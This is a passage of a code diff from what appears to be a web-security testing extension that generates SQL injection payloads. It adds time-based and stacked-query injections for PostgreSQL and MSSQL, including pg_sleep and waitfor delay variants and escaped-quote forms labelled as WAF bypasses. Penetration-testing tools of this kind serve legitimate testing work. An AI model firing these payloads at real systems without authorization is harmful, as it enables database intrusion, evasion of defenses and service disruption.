+                                listSQLi.append(prefix + escapeChar + ";select pg_sleep(1000)" + suffix + "\n")
+                                listSQLi.append(prefix + escapeChar + " and 1337=(select 1337 from pg_sleep(1000))" + suffix + "\n")                                    
+                                listSQLi.append(prefix + escapeChar + " or 1337=(select 1337 from pg_sleep(1000))" + suffix + "\n")
+                            else:
+                                listSQLi.append(prefix + ";select pg_sleep(1000)" + suffix + "\n")
+                                listSQLi.append(prefix + ";select pg_sleep(1000)" + "\n")
+                                listSQLi.append(prefix + " and 1337=(select 1337 from pg_sleep(1000))" + suffix + "\n")
+                                listSQLi.append(prefix + " and 1337=(select 1337 from pg_sleep(1000))" + "\n")
+                                listSQLi.append(prefix + " or 1337=(select 1337 from pg_sleep(1000))" + suffix + "\n")
+                                listSQLi.append(prefix + " or 1337=(select 1337 from pg_sleep(1000))" + "\n")
+                    if self._cbMssqlBased.isSelected():
+                        if self._cbStackedSQL.isSelected():
+                            listSQLi.append(prefix + escapeChar + ";select @@version" + suffix + "\n")
+                            if not escapeChar:
+                                listSQLi.append(prefix + escapeChar + ";select @@version" + "\n")
+                        if self._cbTimeBased.isSelected():
+                            if escapeChar:
+                                listSQLi.append(prefix + escapeChar + " waitfor delay " + escapeChar + "00:20" + escapeChar + suffix + "\n")
+                                listSQLi.append(prefix + escapeChar + ";waitfor delay " + escapeChar + "00:20" + escapeChar + suffix + "\n")
+                            else:
+                                listSQLi.append(prefix + " waitfor delay '00:20'" + suffix + "\n")
+                                listSQLi.append(prefix + " waitfor delay '00:20'" + "\n")
+                                listSQLi.append(prefix + ";waitfor delay '00:20'" + suffix + "\n")
+                                listSQLi.append(prefix + ";waitfor delay '00:20'" + "\n")
+                                if self._cbSqlWafBypass.isSelected():
+                                    listSQLi.append(prefix + " waitfor delay \\'00:20\\'" + suffix + "\n")
+                                    listSQLi.append(prefix + " waitfor delay \\'00:20\\'" + "\n")
+                                    listSQLi.append(prefix + ";waitfor delay \\'00:20\\'" + suffix + "\n")
+                                    listSQLi.append(prefix + ";waitfor delay \\'00:20\\'" + "\n")
+                                    listSQLi.append(prefix + " waitfor delay \\\\'00:20\\\\'" + suffix + "\n")
+                                    listSQLi.append(prefix + " waitfor delay \\\\'00:20\\\\'" + "\n")
+                                    listSQLi.append(prefix + ";waitfor delay \\\\'00:20\\\\'" + suffix + "\n")
+                                    listSQLi.append(prefix + ";waitfor delay \\\\'00:20\\\\'" + "\n")
         listSQLi = list(set(listSQLi))
         listSQLi.sort()
         if self._cbSqlEncoding.isSelected():
